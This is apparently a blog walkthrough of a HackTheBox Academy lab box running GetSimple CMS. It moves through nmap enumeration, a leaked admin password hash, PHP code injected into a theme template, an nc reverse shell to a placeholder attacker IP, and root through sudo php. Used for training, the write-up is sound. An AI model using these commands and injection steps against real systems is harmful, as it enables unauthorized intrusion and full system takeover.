# HackTheBox-Module-Getting-Started-Knowledge-Check-Walk-through
Embark on a journey through HackTheBox Academy’s Penetration Tester path with me! This blog chronicles my progress with detailed walk-throughs and personal notes important modules throughout the path. Whether you’re a beginner or looking to refine your skills, these write-ups aim to serve as a valuable reference guide in your own penetration testing endeavors.

Target
10.129.30.42

Questions
Answer the question(s) below to complete this Section and earn cubes!

Spawn the target, gain a foothold and submit the contents of the user.txt flag.
After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
Enumeration
In this challenge, nothing is given to us aside from the target IP of the box. Let’s start by running nmap to find what open ports are on this target.

$ nmap -sC -sV -oA enum_scan 10.129.30.42 -v
Flags:

-sV Enables version scanning to probe open ports and determine version/service information.

-sC Runs default nmap scripts to look for common vulnerabilities, misconfiguration, and authentication issues.

-oA enum_scan Saves output of scan in all major formats (nmap, gnmap, xml).
![image](https://github.com/user-attachments/assets/934fec5a-284c-42da-ab19-a7440975e41a)


nmap scan results of target
Several things had caught my eye from this.

Open ports: 22, 80
http-robots.txt has 1 disallowed entry at /admin
GetSimple looks to be the installed content management system (CMS) as seen from the http-server-title
http-server-header shows Apache 2.4.41 is used on the Ubuntu server
Vulnerable Version Exploits
Before we move into the application itself, let’s use the information we’ve already gathered to get an idea of what exploits might be available for GetSimple.

Below, I’m using searchsploit to find vulnerabilities for this tool. If you do not already have this on your machine, install it by using the command below.

sudo apt install -y exploitdb
![image](https://github.com/user-attachments/assets/fb060651-3035-466b-974f-c1b649524f55)

GetSimple Exploits
At this point, since we are unsure which version of GetSimple the target is running, let’s put this information to the side for later to know which of these might apply.

We can apply the same techniques to look for any vulnerabilities with Apache 2.4.41, however, this does not look promising.
![image](https://github.com/user-attachments/assets/bb91f255-bcac-4eeb-84c0-d90f1398f816)


Apache 2.4.41 Exploits
HTTP Exploration
Since port 80 is open, we know there is likely a web server being hosted at this target IP — the existence of robots.txt and the http- headers confirm this as well. Let’s visit the site and see what we can find.
![image](https://github.com/user-attachments/assets/d1c3310e-aed9-4fa7-b9bf-f4100db63bf1)


Target homepage
At first glance, there isn’t much of interest on this homepage… until we begin to scroll down towards the bottom of the page and notice the following line of text.
![image](https://github.com/user-attachments/assets/14965189-b371-4fb6-ade8-32b13efe71a4)


Theme exposure
Try to visit http://10.129.30.42/theme and see if we can get any more information from this.

Ah! This path seems to be vulnerable to directory traversal. Let’s poke around and see what we can find.

Looking into the Innovation folder, notice the presence of some php files. Let’s set this information to the side for now as we do not have any way to modify files from the browser.

Going back to our nmap scan, notice that robots.txt disallows the traversal of /admin which could be something useful.

Visit http://10.129.130.42/admin to notice a login page. Nice find!

Now that we have a login page we can take several routes. Perhaps a brute force attack using Burp Suite or hydra could break us in, however, we have neither username or password so it would be a shot in the dark. Let’s see if digging around the site more will unveil more information leading us to getting into the admin dashboard.

Documentation Review
Back on the homepage, notice towards the top of the page the mention of GetSimple CMS Documentation. Let’s visit this page and see if we can find clues towards our next step.

Starting at the GetSimple Basics page, we can get an idea of how the tool works. Since we need to try and get user data to log into the admin portal, let’s visit data as the wiki notes…

/data - here, the user-generated data is stored.

Again, notice we’re able to traverse directories here! We only see 1 user, admin, with the following XML file information.

xml
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
Looks like we’ve found the admin password in between the <PWD></PWD> tags!

Admin Panel Access
However, at first sight, you might notice this is a strange string and appears to be hashed… Let’s run it through crackstation.net and see if it comes back with any results! (If you’d rather be more hack-y and use hashcat feel free!)
![image](https://github.com/user-attachments/assets/c3d352c9-f56e-4e0f-8487-e9f06cbe270f)


Hash of admin password
Huzzah! We’ve cracked the admin account! Now, let’s navigate back to the /admin page with out super secret credentials below.

admin:admin
![image](https://github.com/user-attachments/assets/90d968de-12bc-4333-b74d-503186dc4b64)


WoW! We’re h3kers now
OK, now that we’ve got access into the admin portal, let’s poke around and being by trying to find a version number.

Click the Support tab with the yellow explanation and you’ll see we’re running version 3.3.15 .

Perfect… notice from the searchsploit command we ran earlier that v3.3.16 is vulnerable to an RCE (remote code execution) vulnerability. Could we upload a PHP file and execute a shell this way?

More Documentation Review
Let’s dig around a bit more in the wiki to see if we can find out any more information on uploading files.

Looking under the Admin Reference section, the Files tab looks promising... let’s check that out.

This article shows us that we have the ability to upload files directly to the server from the browser in the far right-hand side tab under File Management .
![image](https://github.com/user-attachments/assets/c6a8b0f4-7442-47ed-ad28-e47df376f3ed)


Note: Unsure if this is an issue with the target or intentional, but I was unable to use the Upload files and/or images button from the target machine to upload my shell.php file.

Re-thinking an Exploit
OK, since this doesn’t seem to work, let’s keep poking around in the admin portal and try to figure out another way to inject our code.

Notice in the Theme tab we can edit themes…. and look! It’s the files we noticed before in the HTTP Exploration section above, however, now we can actually edit the file!
![image](https://github.com/user-attachments/assets/d3bdd6b0-0924-4f56-888d-76cabdf16007)


Editing /theme/Innovation/template.php
You may have noticed something interesting while looking around for this page. The Default Template shown in the image above is used on the Homepage. This means that if we edit the above file in templates.php and visit the homepage, our exploit should work!
![image](https://github.com/user-attachments/assets/43164f2e-09a1-4ca5-921b-94560efc8a1b)


Homepage uses the Default Template theme
Now, let’s first try to run a simple command and print out the id of the system on the homepage by adding the following line of code in the beginning of the PHP file.

<?php system('id'); ?>
Huzzah! After saving this change, we now see the following on the homepage.
![image](https://github.com/user-attachments/assets/26c61d46-286c-4fa3-88fe-55cc24897924)


RCE Exploit
Getting a Reverse Shell
Now, let’s get down to the gritty and upload some code to get us a reverse shell!

Important Note before continuing:

Since we’re using the HTB VPN connection, ensure the {Attacking IP}below is the tun0 interface IP from your local machine! I had tried running the VPN on my desktop and running the attack on my VM through my eth0 interface IP and this did not work even though I could reach the target site fine and even ping the target from my VM.
{Listening port}can be whatever is opened on your machine. I’ll use 9443 for my box.
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Attack IP} {Listening port} >/tmp/f"); ?>
Save the changes, then start a netcat listener on the listening port used above from your local machine running the attack.

$ nc -lvnp {listening port}
Next, simple visit the homepage to open the shell!
![image](https://github.com/user-attachments/assets/b504163d-2b52-462f-89a5-fdb4057f31d9)


Reverse Shell obtained
Note: When refreshing the Homepage to execute the shell, the web server will not load the page. This is normal.

Now that we have a shell, let’s upgrade our TTY to have a few additional nice-to-have features in our terminal. Simply use the commands below in sequential order.

First, run the following python command in the shell.

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Next, hit Ctrl+z on your keyboard to interrupt the shell connection, and, while back on your local host terminal, use the following steps.

$ stty raw -echo
$ fg

ENTER
ENTER
Now we just need to poke around until we find the flag!
![image](https://github.com/user-attachments/assets/34b94373-150d-4d06-8fe3-b33f75b1333c)


user.txt flag obtained!
Privilege Escalation
Now that we’ve got our foothold and gained access to the server as a local user, we need to find a way to elevate our privileges and become root to grab the next flag.

First, let’s run the LinEnum.sh script mentioned in the Privilege Escalation section of this module and get this file into our new target.

Note that if you need to get this file again, simple visit https://github.com/rebootuser/LinEnum.git to copy the script onto your local machine.

A fast, easy, and reliable method to transfer files from your local machine onto your target after a shell is obtained is using the Python simplehttp web server module.

Begin by starting a simple web server on your local machine in the directory where the LinEnum.sh script exists.
![image](https://github.com/user-attachments/assets/172b0015-efe9-4ddd-ac4f-a0f771b3ef87)

$ python -m http.server 8080 #any port will work if 8080 is in use

python simple http server
Next, back in our shell, use wget to grab the file from our local machine. Remember to use the tun0 interface IP from your local machine while using the HTB VPN.
![image](https://github.com/user-attachments/assets/50710af7-fff6-450c-b6d3-551ac86f9bb8)

$ wget http://{Attackig IP}:8080/LinEnum.sh

wget LinEnum.sh
Note: You cannot write into every directory in the target. Check permissions of the directory if you’re unable to write.

$ chmod +x LinEnum.sh
$ ./LinEnum.sh
Once the script has completed, notice that we’ve got a potential way to pwn the root user…


sudo pwnage
Now, I had to Google this next part as I wasn’t sure what this file was exactly. Below is the command to start a new connection as root.
![image](https://github.com/user-attachments/assets/0d2351f3-2df4-4964-b3f0-d50da90533db)

www-data@gettingstarted:/usr/bin$ CMD="/bin/sh"
www-data@gettingstarted:/usr/bin$ sudo /usr/bin/php -r "system('$CMD');"

root shell obtained
Note that the shell is pretty finikey and is missing a handful of features, however, you are now the root user and can obtain the last flag!

Note: I’m guessing since we’re now running a shell in a shell, something has broken in a way that may not be fixable. I wasn’t able to upgrade TTY, however, if you did want a nicer shell and go above and beyond, there’s an id_rsa in the /root/.ssh directory for SSH you could copy and use to SSH through a terminal on your local machine.

Now we just have to navigate around a bit and find the flag :)
![image](https://github.com/user-attachments/assets/bd86010f-133e-4dec-a1ff-3093331b1173)


root flag
